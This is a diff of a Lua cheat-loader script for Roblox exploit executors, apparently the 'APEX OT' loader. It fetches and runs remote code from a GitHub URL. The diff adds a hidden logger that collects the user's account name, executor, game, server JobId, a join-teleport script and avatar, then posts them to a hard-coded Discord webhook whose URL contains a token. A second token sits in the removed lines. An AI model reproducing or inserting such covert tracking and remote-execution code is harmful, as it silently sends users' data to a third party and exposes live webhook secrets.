@@ -120,111 +120,93 @@ if Brookhaven then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/takgoo170/APEX/refs/heads/main/brookhaven.lua"))()
 end
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
 
 if getgenv().LoggerRan then return end
 getgenv().LoggerRan = true
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local embedFields = {}
 
--- I-REPLACE ITO ng sarili mong webhook:
-local webhookUrl = "https://discord.com/api/webhooks/1383492519819612250/MLMPB16V8oksbyb_YiKbS-M7pLThXSGyV8gi13Z3EFxkmoYfqPAOmBT4omsOQfHromdu"
+-- 👤 Account
+table.insert(embedFields, {
+    name = "[👤] Account",
+    value = "```" .. Player.Name .. "```",
+    inline = true
+})
 
--- Detect executor
-local function detectExecutor()
-    if identifyexecutor then
-        return identifyexecutor()
-    elseif KRNL_LOADED then
-        return "KRNL"
-    elseif is_sirhurt_closure then
-        return "SirHurt"
-    elseif syn then
-        return "Synapse X"
-    elseif isexecutorclosure then
-        return "Electron"
-    else
-        return "Unknown"
-    end
+-- 💻 Executor
+table.insert(embedFields, {
+    name = "[💻] Executor",
+    value = "```" .. (identifyexecutor and identifyexecutor() or "Unknown") .. "```",
+    inline = true
+})
+
+-- 🎮 Game Detection via PlaceId
+local placeId = game.PlaceId
+local gameName = "Unknown Game"
+local gameIcon = "❓"
+local themeColor = 0x7289DA
+
+if placeId == 13772394625 then
+    gameName = "Grow A Garden 🌱"
+    gameIcon = "🪴"
+    themeColor = 0x57F287 -- green
+elseif placeId == 4924922222 then
+    gameName = "Brookhaven 🏡RP"
+    gameIcon = "🏡"
+    themeColor = 0x3498DB -- blue
 end
 
--- Executor theme: color + tagline
-local function getExecutorTheme(executor)
-    local themes = {
-        ["Synapse X"] = { color = 0x7289DA, tagline = "⚡ Running on Synapse X" },
-        ["KRNL"]      = { color = 0x00FFFF,  tagline = "🧪 Powered by KRNL" },
-        ["Electron"]  = { color = 0xFFD700,  tagline = "🔋 Executed via Electron" },
-        ["SirHurt"]   = { color = 0xFF69B4,  tagline = "💉 SirHurt Detected" },
-        ["Unknown"]   = { color = 0xA9A9A9,  tagline = "❓ Unknown Executor Used" }
-    }
-    return themes[executor] or themes["Unknown"]
-end
+table.insert(embedFields, {
+    name = "[🎮] Game",
+    value = "```" .. gameName .. "```",
+    inline = false
+})
 
--- Join script
-local function createJoinScript()
-    return string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId)
-end
+-- 🌐 Server Job ID
+table.insert(embedFields, {
+    name = "[🌐] Server Job ID",
+    value = "```" .. tostring(game.JobId) .. "```",
+    inline = false
+})
 
--- Roblox avatar
-local function getAvatarUrl(userId)
-    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
-end
+-- 🔗 Join Script
+local teleportScript = string.format(
+    "game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')",
+    placeId, game.JobId
+)
 
--- Send webhook
-local function sendLog()
-    local executor = detectExecutor()
-    local theme = getExecutorTheme(executor)
+table.insert(embedFields, {
+    name = "[🔗] Join Script",
+    value = "```lua\n" .. teleportScript .. "\n```",
+    inline = false
+})
 
-    local data = {
-        ["content"] = "**[Script Logger Triggered]**\n" .. theme.tagline,
-        ["embeds"] = {{
-            ["title"] = "User Executed Script | APEX OT Script Logger",
-            ["color"] = theme.color,
-            ["fields"] = {
-                {
-                    ["name"] = "[👤] Account Name",
-                    ["value"] = "```" .. LocalPlayer.Name .. "```",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "[💻] Executor",
-                    ["value"] = "```" .. executor .. "```",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "[🎮] Current Game",
-                    ["value"] = string.format("```%s (https://www.roblox.com/games/%s)```", game.Name or "Unknown", game.PlaceId),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "[🔗] Job Id",
-                    ["value"] = "```" .. game.JobId .. "```",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "[📜] Join Script",
-                    ["value"] = "```lua\n" .. createJoinScript() .. "\n```",
-                    ["inline"] = false
-                }
+-- 🖼 Avatar thumbnail
+local avatarUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. Player.UserId .. "&size=420x420&format=Png&isCircular=false"
+
+-- 📤 Send to webhook
+request({
+    Url = "https://discord.com/api/webhooks/1383600889025007738/UZ0haW5_-96Crsx4WmlXFXewbzYK7FlyCDEkL7G43NzN8DspVJH-vrH1-7rPV8SfIn7K",
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode({
+        embeds = {{
+            title = gameIcon .. " Execution Logger",
+            description = "Execution details of a user:",
+            color = themeColor,
+            fields = embedFields,
+            thumbnail = {
+                url = avatarUrl
             },
-            ["thumbnail"] = {
-                ["url"] = getAvatarUrl(LocalPlayer.UserId)
+            footer = {
+                text = "Made by: Takgoo | 🔔 Logger System for Apex OT"
             },
-            ["footer"] = {
-                ["text"] = "Logger • Educational Use Only • ID: " .. HttpService:GenerateGUID(false)
-            },
-            ["timestamp"] = DateTime.now():ToIsoDate()
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
-    }
-
-    local success, err = pcall(function()
-        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
-    end)
-
-    if not success then
-        warn("[LOGGER FAILED]:", err)
-    end
-end
-
--- Run it
-sendLog()
+    })
+})
